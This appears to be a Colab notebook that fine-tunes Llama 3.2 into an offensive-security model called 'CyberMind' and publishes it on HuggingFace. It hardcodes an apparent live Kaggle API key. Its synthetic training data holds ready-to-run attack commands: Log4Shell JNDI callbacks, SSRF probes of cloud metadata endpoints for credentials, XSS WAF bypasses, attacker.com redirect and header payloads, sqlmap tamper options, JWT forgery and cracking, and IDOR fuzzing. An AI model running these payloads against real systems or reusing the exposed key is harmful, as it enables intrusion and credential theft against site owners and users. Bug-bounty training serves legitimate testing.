# CyberMind AI Fine-Tuning — Fully Automated

## Sirf 2 Steps:
1. **Runtime → Change runtime type → T4 GPU → Save**
2. **Runtime → Run All**

Bas! Sab credentials already set hain. 2 hours wait karo.

In [ ]:
# Step 1: GPU Check
import torch
if not torch.cuda.is_available():
    raise RuntimeError('GPU nahi mila! Runtime -> Change runtime type -> T4 GPU -> Save karo, phir Run All')
print(f'GPU: {torch.cuda.get_device_name(0)}')
print(f'Memory: {torch.cuda.get_device_properties(0).total_memory/1024**3:.1f}GB')
print('GPU ready!')

In [ ]:
# Step 2: Install Dependencies
print('Installing... (5-10 min)')
import subprocess, sys
for p in ['transformers==4.44.0','datasets','trl==0.9.6','accelerate','bitsandbytes','peft','kagglehub','pandas','requests','tqdm','huggingface_hub']:
    subprocess.check_call([sys.executable,'-m','pip','install',p,'-q'])
print('Installed!')

In [ ]:
# Step 3: Setup Credentials
# Kaggle is pre-configured. HuggingFace token load from Colab Secrets.
import os, json
os.makedirs('/root/.kaggle', exist_ok=True)
with open('/root/.kaggle/kaggle.json','w') as f:
    json.dump({'username':'cybermindcli','key':'d946427f9e4d90b7e3438f061b80b485'},f)
os.chmod('/root/.kaggle/kaggle.json',0o600)

# HuggingFace token — 2 ways to set:
# Option A (Recommended): Colab Secrets (left sidebar -> key icon -> add HF_TOKEN)
# Option B: Paste directly below
try:
    from google.colab import userdata
    HF_TOKEN = userdata.get('HF_TOKEN')
    print('HF token loaded from Colab Secrets!')
except:
    # Fallback: paste your token here
    HF_TOKEN = 'PASTE_YOUR_HF_TOKEN_HERE'  # hf_QTpTHy... wala token yahan dalo
    print('HF token from manual input')

from huggingface_hub import login
login(token=HF_TOKEN, add_to_git_credential=False)
print('Kaggle + HuggingFace ready!')

In [ ]:
# Step 4: Load Model (10 min)
print('Loading Llama 3.2 3B...')
from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig, TrainingArguments
from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training
from trl import SFTTrainer
from datasets import Dataset
import torch

bnb = BitsAndBytesConfig(
    load_in_4bit=True,
    bnb_4bit_quant_type='nf4',
    bnb_4bit_compute_dtype=torch.float16,
    bnb_4bit_use_double_quant=True
)
model = AutoModelForCausalLM.from_pretrained(
    'meta-llama/Llama-3.2-3B-Instruct',
    quantization_config=bnb,
    device_map='auto',
    trust_remote_code=True
)
tokenizer = AutoTokenizer.from_pretrained('meta-llama/Llama-3.2-3B-Instruct', trust_remote_code=True)
tokenizer.pad_token = tokenizer.eos_token
tokenizer.padding_side = 'right'
model = prepare_model_for_kbit_training(model)
model = get_peft_model(model, LoraConfig(
    r=16, lora_alpha=16,
    target_modules=['q_proj','k_proj','v_proj','o_proj'],
    lora_dropout=0.05, bias='none', task_type='CAUSAL_LM'
))
print('Model loaded!')

In [ ]:
# Step 5: Download Datasets (10-15 min)
print('Downloading datasets...')
import kagglehub, pandas as pd, requests, random
from pathlib import Path
all_entries = []

# Kaggle Bug Hunter
try:
    path = kagglehub.dataset_download('vellyy/bug-hunter')
    for f in Path(path).rglob('*.csv'):
        df = pd.read_csv(f, encoding='utf-8', errors='replace')
        tc = next((c for c in df.columns if any(k in c.lower() for k in ['title','name'])), None)
        dc = next((c for c in df.columns if any(k in c.lower() for k in ['desc','detail','report','body'])), None)
        if tc and dc:
            for _,row in df.iterrows():
                t,d = str(row.get(tc,'')).strip(), str(row.get(dc,'')).strip()
                if t and d and len(d)>50:
                    all_entries.append({
                        'instruction': f'Analyze this bug bounty finding and explain exploitation: {t}',
                        'output': f'## {t}\n\n{d[:1200]}\n\n## How to Test\nnuclei -u https://TARGET -severity critical,high -silent\n\n## Impact\nUnauthorized access or data exposure.'
                    })
    print(f'  Kaggle: {len(all_entries)} entries')
except Exception as e:
    print(f'  Kaggle failed: {e}')

# Figshare CVE
try:
    api = requests.get('https://api.figshare.com/v2/articles/22056617', timeout=30).json()
    url = api['files'][0]['download_url']
    print('  Downloading Figshare CVE...')
    r = requests.get(url, timeout=180)
    cve_data = r.json() if 'json' in r.headers.get('content-type','') else []
    if isinstance(cve_data, dict):
        cve_data = cve_data.get('cves', cve_data.get('vulnerabilities', []))
    before = len(all_entries)
    for cve in cve_data[:3000]:
        cid = cve.get('id','')
        desc = cve.get('description','')
        sev = cve.get('severity','medium')
        if cid and desc and len(desc)>30:
            all_entries.append({
                'instruction': f'Explain {cid} and how to exploit it in bug bounty. Give exact commands.',
                'output': f'## {cid} ({sev.upper()})\n\n{desc[:800]}\n\n## Detection\nnuclei -u https://TARGET -tags {cid.lower()} -silent\n\n## Manual Test\ncurl -v https://TARGET/VULNERABLE_ENDPOINT\n\n## Impact\nSystem compromise possible.'
            })
    print(f'  Figshare CVE: {len(all_entries)-before} entries')
except Exception as e:
    print(f'  Figshare failed: {e}')

# Synthetic Security Dataset
SYNTHETIC = [
    {'instruction':'How to test price manipulation in e-commerce?','output':'## Price Manipulation\n\nStep 1: Intercept POST /checkout\nStep 2: Change price=-99.99 (negative = credit)\nStep 3: Change price=0 (free item)\nStep 4: Race condition: 20 concurrent coupon requests\n\nExpected: Coupon applied 3-5x = Race condition bug ($2k-$10k)'},
    {'instruction':'OAuth missing state parameter CSRF test?','output':'## OAuth CSRF\n\nTest without state:\nhttps://target.com/oauth/authorize?response_type=code&client_id=ID&redirect_uri=https://target.com/callback\n\nVulnerable if: No error\nTest redirect_uri: redirect_uri=https://attacker.com\n\nImpact: Account takeover ($5k-$20k)'},
    {'instruction':'Node.js target, nothing found. Novel attacks?','output':'## Novel Attacks\n\n1. Prototype Pollution: curl https://target.com/?__proto__[admin]=true\n2. HTTP Smuggling: python3 smuggler.py -u https://target.com -v\n3. SSRF: POST /webhook {url:http://169.254.169.254/latest/meta-data/}\n4. Cache Poisoning: curl -H X-Forwarded-Host:attacker.com https://target.com/'},
    {'instruction':'Explain Log4Shell CVE-2021-44228','output':'## CVE-2021-44228 Log4Shell (CVSS 10.0)\n\nVuln: JNDI injection in Log4j 2.x\n\nDetect:\nnuclei -u https://TARGET -tags log4j -silent\ncurl -H User-Agent:${jndi:ldap://YOUR_URL/a} https://TARGET\n\nIf DNS callback = RCE confirmed\nBounty: $10k-$100k+'},
    {'instruction':'S3 bucket misconfiguration testing?','output':'## S3 Testing\n\naws s3 ls s3://BUCKET --no-sign-request\ncurl https://BUCKET.s3.amazonaws.com/\ncloud_enum -k COMPANY\n\nGCS: curl https://storage.googleapis.com/BUCKET/\nFirebase: curl https://TARGET.firebaseio.com/.json\n\nImpact: $5k-$50k'},
    {'instruction':'Cloudflare WAF blocking XSS. Bypass?','output':'## Cloudflare Bypass\n\n1. URL encode: %3Cscript%3Ealert(1)%3C/script%3E\n2. Case: <ScRiPt>alert(1)</sCrIpT>\n3. Event: <img src=x onerror=alert(1)>\n4. dalfox: dalfox url TARGET?q=FUZZ --waf-bypass --delay 1000\n5. Headers: curl -H X-Forwarded-For:127.0.0.1'},
    {'instruction':'Android APK security testing?','output':'## APK Testing\n\napktool d target.apk -o /tmp/decompiled/\njadx -d /tmp/jadx/ target.apk\n\nFind secrets:\ngrep -r api_key /tmp/jadx/ --include=*.java\ngrep -r AKIA /tmp/jadx/\n\nSSL bypass: frida -U -f com.target.app -l ssl_bypass.js\nRoute through ZAP after bypass'},
    {'instruction':'GraphQL security testing?','output':'## GraphQL Testing\n\nIntrospection:\ncurl -X POST https://target.com/graphql -d {query:{__schema{types{name}}}}\n\nIDOR:\ncurl -X POST -d {query:{user(id:2){email,password}}}\n\nBatching (rate limit bypass):\ncurl -X POST -d [{query:mutation{login(u:admin,p:pass1)}}]'},
    {'instruction':'SSRF exploitation guide?','output':'## SSRF Exploitation\n\nTest: curl https://target.com?url=http://169.254.169.254/latest/meta-data/\n\nAWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\nGCP: http://metadata.google.internal/computeMetadata/v1/\n\nOOB: interactsh-client -server oast.pro -n 1\n\nImpact: Cloud credentials = full account compromise'},
    {'instruction':'SQL injection testing methodology?','output':'## SQLi Testing\n\nManual:\ncurl https://target.com?id=1 (baseline)\ncurl https://target.com?id=1 AND SLEEP(5) (time-based)\n\nAutomated:\nsqlmap -u https://target.com?id=1 --batch --level 3 --risk 2 --dbs\n\nWAF bypass:\n--tamper=space2comment,between,randomcase,charencode --delay 1 --random-agent'},
    {'instruction':'Business logic IDOR testing?','output':'## IDOR Testing\n\nFind numeric IDs in requests:\nGET /api/orders/1001 (your order)\nGET /api/orders/1000 (another user = IDOR!)\n\nAutomate:\nffuf -u https://target.com/api/orders/FUZZ -w <(seq 1000 1100) -H Cookie:session=YOUR_SESSION -mc 200\n\nMass assignment:\nPOST /api/user {role:admin, is_admin:true}\n\nImpact: $1k-$10k'},
    {'instruction':'HTTP request smuggling detection?','output':'## HTTP Request Smuggling\n\nDetect:\npython3 smuggler.py -u https://target.com -v\n\nManual CL.TE test:\nPOST / HTTP/1.1\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n\nIf 404 on second request = vulnerable\nImpact: WAF bypass, cache poisoning, account takeover'},
    {'instruction':'JWT security testing?','output':'## JWT Testing\n\njwt_tool TOKEN -t https://target.com/api/user -rh Authorization:Bearer TOKEN -M at\n\nAlgorithm confusion (RS256 to HS256):\njwt_tool TOKEN -X a\n\nalg:none bypass:\nChange header to {alg:none} + remove signature\n\nWeak secret brute force:\nhashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt'},
    {'instruction':'Web cache poisoning attack?','output':'## Cache Poisoning\n\nTest unkeyed headers:\ncurl -H X-Forwarded-Host:attacker.com https://target.com/\ncurl -H X-Forwarded-Scheme:https https://target.com/\ncurl -H X-Original-URL:/admin https://target.com/\n\nIf response reflects header = cache poisoning possible\n\nTool: param-miner (Burp extension)\nImpact: XSS delivery to all users'},
    {'instruction':'CyberMind agent decision: recon done, tech=WordPress, WAF=Cloudflare. What next?','output':'## Agent Decision: hunt\n\nFocus: sqli,xss,rce\nConfidence: 90%\n\nWordPress + Cloudflare strategy:\n1. wpscan --enumerate ap,at,u,m --plugins-detection aggressive\n2. nuclei -t wordpress/ -severity critical,high\n3. Check xmlrpc.php for brute force\n4. Check wp-json/wp/v2/users for enumeration\n\nCloudflare bypass: --delay 1000 --random-agent --tamper space2comment\n\nNext: If bugs found -> Abhimanyu exploit phase'},
]
all_entries.extend(SYNTHETIC)
random.shuffle(all_entries)
print(f'  Synthetic: {len(SYNTHETIC)} entries')
print(f'  TOTAL: {len(all_entries)} training examples')

In [ ]:
# Step 6: Format Dataset
print('Formatting dataset...')
dataset = Dataset.from_list(all_entries)
dataset = dataset.map(lambda x: {'text': f"### Instruction:\n{x['instruction']}\n\n### Response:\n{x['output']}{tokenizer.eos_token}"})
print(f'Dataset ready: {len(dataset)} examples')

In [ ]:
# Step 7: Train (~2 hours)
print('Starting training (~2 hours)...')
print('Progress logged every 10 steps. You can minimize this tab.')

trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=dataset,
    dataset_text_field='text',
    max_seq_length=2048,
    args=TrainingArguments(
        output_dir='cybermind_model',
        num_train_epochs=3,
        per_device_train_batch_size=2,
        gradient_accumulation_steps=4,
        learning_rate=2e-4,
        fp16=True,
        logging_steps=10,
        save_strategy='epoch',
        optim='paged_adamw_8bit',
        report_to='none',
    ),
)

result = trainer.train()
print(f'Training complete! Time: {result.metrics["train_runtime"]/60:.1f} minutes')

In [ ]:
# Step 8: Save Model
print('Saving model...')
model.save_pretrained('cybermind_lora')
tokenizer.save_pretrained('cybermind_lora')
print('Model saved: cybermind_lora/')

In [ ]:
# Step 9: Upload to HuggingFace (Free for everyone)
print('Uploading to HuggingFace...')
from huggingface_hub import HfApi
api = HfApi()
try:
    api.create_repo('thecnical/cybermind-security', private=False, exist_ok=True)
except:
    pass
api.upload_folder(
    folder_path='cybermind_lora',
    repo_id='thecnical/cybermind-security',
    repo_type='model',
    commit_message='CyberMind Security Model v1.0'
)
print('=' * 60)
print('MODEL LIVE: https://huggingface.co/thecnical/cybermind-security')
print('=' * 60)
print()
print('NEXT: Enable in backend:')
print('1. Edit: cybermind-backend/src/routes/free.js')
print('2. Uncomment: { id: "thecnical/cybermind-security", name: "CyberMind Security" },')
print('3. git add -A && git commit -m "enable model" && git push')

In [ ]:
# Step 10: Test Model
print('Testing model...')
model.eval()
for q in ['How to find XSS?', 'Explain Log4Shell', 'What is SSRF?']:
    inp = tokenizer(f'### Instruction:\n{q}\n\n### Response:\n', return_tensors='pt').to('cuda')
    with torch.no_grad():
        out = model.generate(**inp, max_new_tokens=150, temperature=0.7, do_sample=True)
        ans = tokenizer.decode(out[0], skip_special_tokens=True)
        resp = ans.split('### Response:')[-1].strip() if '### Response:' in ans else ans
        print(f'Q: {q}')
        print(f'A: {resp[:300]}')
        print()